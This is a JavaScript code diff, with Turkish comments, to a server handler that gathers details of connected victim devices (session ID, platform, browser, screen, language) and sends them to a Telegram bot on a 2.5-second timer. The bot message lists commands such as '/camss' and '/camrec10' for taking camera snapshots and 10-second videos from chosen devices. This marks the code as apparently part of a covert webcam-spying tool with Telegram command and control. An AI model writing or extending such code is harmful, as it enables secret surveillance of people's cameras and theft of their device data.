@@ -39,81 +39,50 @@ export default async function handler(req, res) {
         // Cihaz bilgisi ekle
         if (action === 'add') {
             if (!deviceCollections.has(collection_id)) {
-                deviceCollections.set(collection_id, {
+                const collection = {
                     devices: [],
-                    created_at: Date.now()
-                });
+                    created_at: Date.now(),
+                    timer: null,
+                    sent: false
+                };
+                
+                deviceCollections.set(collection_id, collection);
+                
+                // 2.5 saniye sonra otomatik gönder
+                collection.timer = setTimeout(async () => {
+                    if (!collection.sent) {
+                        collection.sent = true;
+                        await sendDeviceList(botToken, chatId, collection_id, deviceCollections);
+                    }
+                }, 2500);
             }
 
             const collection = deviceCollections.get(collection_id);
+            
+            // Bu collection zaten gönderildiyse yeni ekleneni kabul etme
+            if (collection.sent) {
+                return res.status(200).json({
+                    success: false,
+                    message: 'Collection already sent',
+                    device_count: collection.devices.length
+                });
+            }
+            
             collection.devices.push(device_info);
 
             return res.status(200).json({
                 success: true,
                 message: 'Device added to collection',
-                device_count: collection.devices.length
+                device_count: collection.devices.length,
+                will_send_in: 2.5
             });
         }
 
-        // Listeyi al ve gönder
+        // Manuel send action (artık gerek yok ama uyumluluk için bırakıldı)
         if (action === 'send') {
-            const collection = deviceCollections.get(collection_id);
-
-            if (!collection || collection.devices.length === 0) {
-                // Hiç cihaz yok
-                const message = '📱 <b>AKTİF CİHAZ YOK</b>\n\nŞu anda bağlı cihaz bulunmuyor.';
-                await sendTelegramMessage(botToken, chatId, message);
-                
-                deviceCollections.delete(collection_id);
-                
-                return res.status(200).json({
-                    success: true,
-                    device_count: 0
-                });
-            }
-
-            // Mesaj oluştur
-            let message = '📱 <b>AKTİF CİHAZLAR</b>\n';
-            message += `━━━━━━━━━━━━━━━━\n`;
-            message += `Toplam: <b>${collection.devices.length}</b> cihaz\n\n`;
-
-            collection.devices.forEach((device, index) => {
-                const deviceNum = index + 1;
-                const platform = device.platform || 'Unknown';
-                const browser = getBrowser(device.user_agent || '');
-                const emoji = getDeviceEmoji(platform);
-                const sessionId = device.session_id || 'unknown';
-                
-                message += `<b>${deviceNum}.</b> ${emoji} <code>${sessionId}</code>\n`;
-                message += `   📱 ${platform} - ${browser}\n`;
-                
-                if (device.screen) {
-                    message += `   📺 ${device.screen}\n`;
-                }
-                
-                if (device.language) {
-                    message += `   🌐 ${device.language}\n`;
-                }
-                
-                message += `   ${device.online === 'Online' ? '🟢 Online' : '🔴 Offline'}\n\n`;
-            });
-
-            message += `━━━━━━━━━━━━━━━━\n`;
-            message += `💡 <b>Kullanım:</b>\n`;
-            message += `• <code>/camss</code> - Tüm cihazlar\n`;
-            message += `• <code>/camss 2</code> - Sadece 2. cihaz\n`;
-            message += `• <code>/camrec10 3</code> - 3. cihazdan 10s video\n`;
-            message += `• <code>/help</code> - Komutları göster`;
-
-            // Telegram'a gönder
-            await sendTelegramMessage(botToken, chatId, message);
-
-            // Collection'ı temizle
-            deviceCollections.delete(collection_id);
-
             return res.status(200).json({
                 success: true,
-                device_count: collection.devices.length
+                message: 'Auto-send is enabled, no need for manual send'
             });
         }
 
@@ -127,6 +96,57 @@ export default async function handler(req, res) {
             message: error.message
         });
     }
+}
+
+// Cihaz listesini oluştur ve gönder
+async function sendDeviceList(botToken, chatId, collectionId, deviceCollections) {
+    const collection = deviceCollections.get(collectionId);
+
+    if (!collection || collection.devices.length === 0) {
+        const message = '📱 <b>AKTİF CİHAZ YOK</b>\n\nŞu anda bağlı cihaz bulunmuyor.';
+        await sendTelegramMessage(botToken, chatId, message);
+        deviceCollections.delete(collectionId);
+        return;
+    }
+
+    // Mesaj oluştur
+    let message = '📱 <b>AKTİF CİHAZLAR</b>\n';
+    message += `━━━━━━━━━━━━━━━━\n`;
+    message += `Toplam: <b>${collection.devices.length}</b> cihaz\n\n`;
+
+    collection.devices.forEach((device, index) => {
+        const deviceNum = index + 1;
+        const platform = device.platform || 'Unknown';
+        const browser = getBrowser(device.user_agent || '');
+        const emoji = getDeviceEmoji(platform);
+        const sessionId = device.session_id || 'unknown';
+        
+        message += `<b>${deviceNum}.</b> ${emoji} <code>${sessionId}</code>\n`;
+        message += `   📱 ${platform} - ${browser}\n`;
+        
+        if (device.screen) {
+            message += `   📺 ${device.screen}\n`;
+        }
+        
+        if (device.language) {
+            message += `   🌐 ${device.language}\n`;
+        }
+        
+        message += `   ${device.online === 'Online' ? '🟢 Online' : '🔴 Offline'}\n\n`;
+    });
+
+    message += `━━━━━━━━━━━━━━━━\n`;
+    message += `💡 <b>Kullanım:</b>\n`;
+    message += `• <code>/camss</code> - Tüm cihazlar\n`;
+    message += `• <code>/camss 2</code> - Sadece 2. cihaz\n`;
+    message += `• <code>/camrec10 3</code> - 3. cihazdan 10s video\n`;
+    message += `• <code>/help</code> - Komutları göster`;
+
+    // Telegram'a gönder
+    await sendTelegramMessage(botToken, chatId, message);
+
+    // Collection'ı temizle
+    deviceCollections.delete(collectionId);
 }
 
 // Telegram mesajı gönder
